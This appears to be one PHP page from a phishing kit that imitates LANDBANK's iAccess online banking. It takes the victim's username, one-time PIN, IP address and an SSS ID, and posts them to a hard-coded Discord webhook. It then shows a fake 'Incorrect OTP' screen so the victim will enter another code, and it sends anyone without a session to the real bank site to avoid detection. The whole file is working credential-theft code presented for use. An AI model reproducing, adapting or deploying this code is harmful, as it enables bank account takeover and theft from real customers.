<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', '0');
set_time_limit(0);
date_default_timezone_set('Asia/Manila');

session_start();
$_SESSION["y"] = '';
if(empty($_SESSION["x"]) ){
    session_destroy();
    session_unset();
    header("Location: https://www.landbank.com/about-us");
    die();
}

$_SESSION['username'];

$number = $_GET['number'];
$ip = $_SERVER['REMOTE_ADDR'];
$otp = $_GET['otp'];

$encodenumotp = base64_encode(base64_encode($otp)); 
$num = base64_decode(base64_decode($number));

$ip = $_SERVER['REMOTE_ADDR'];
$status = "Attempted OTP";

$webhookurl = "https://discord.com/api/webhooks/1394689160601669787/pkXOqqZSsh_2R_AZlpknUH5qxFWuHp2SKy0DtGT-AOYvIKCXOdajFmCeUtNbQsFD5bqI";

$payload = json_encode([
    "username" => "🌐 LBP iAccess Monitoring",
    "avatar_url" => "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7P4CpxuhkmnaABwQq791Zn5Ci2N1ZTT5JKw&s",
    "embeds" => [[
        "title" => "📝 One Time PIN Attempt",
        "description" => 
        "```md\n# A visitor attempted to access the system\n\n" . "```".
        
             "```\nIP Address :     $ip```".
             
             "```\nUsername   :     ".$_SESSION['username']."
                 \nOTP        :     $number```".
                 
             "```\nStatus     :     $status```".
             "```\nSSS ID     :     ".$_SESSION["x"]."\n```",
             
        "color" => 0xf1c40f, // Yellow
        "footer" => [
                    "text" => "LBP iAccess • Monitoring Engine",
                    "icon_url" => "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7P4CpxuhkmnaABwQq791Zn5Ci2N1ZTT5JKw&s"
                ],
                "timestamp" => date("c")
    ]]
]);

$options = [
    'http' => [
        'header'  => "Content-Type: application/json\r\n",
        'method'  => 'POST',
        'content' => $payload,
    ]
];

$context = stream_context_create($options);
@file_get_contents($webhookurl, false, $context);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="LANDBANK">
    <meta name="author" content="LANDBANK">
    <link rel="icon" href="img/lb-icon.png">
    <title>ERROR OTP | Login</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background-color: #f2f2f2; } #myModal { display: flex; align-items: center; justify-content: center; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0, 0, 0, 0.4); } .modal-content { background-color: #fefefe; padding: 20px; border: 1px solid #888; border-radius: 20px; max-width: 80%; width: 400px; text-align: center; } @font-face { font-family: 'Larken Black'; src: url('fonts/Larken-Black.woff') format('woff') } .checktext { font-family: 'Larken Black'; src: url('fonts/Larken-Black.woff') format('woff'); font-size: 35px; color: #373737; } .subtext { font-family: 'Karla', sans-serif; font-size: 18px; color: gray; } img { width: 70%; height: auto; margin: 0 auto; } #nextBtn { background-color: green; color: black; font-size: 20px; padding: 20px 40%; font-weight: bold; border: none; border-radius: 40px; cursor: pointer; margin-top: 10px; display: block; margin-left: auto; margin-right: auto; }
    </style>
</head>
<body>
<div id="myModal" class="modal">
    <div class="modal-content">
        <img src="img/landbank-logo-removebg-preview.png" alt="PNG">
         <br><br>
         <div style="color: red;" class="subtext">Incorrect OTP</div><br>
        <div style="font-size: 15px;" class="subtext">Enter the OTP (One-Time Password) sent to your mobile number</div><br><br>
        <button id="nextBtn" onclick="window.location.href='otp.php'">Proceed</button>
    </div>
</div>
</body></html>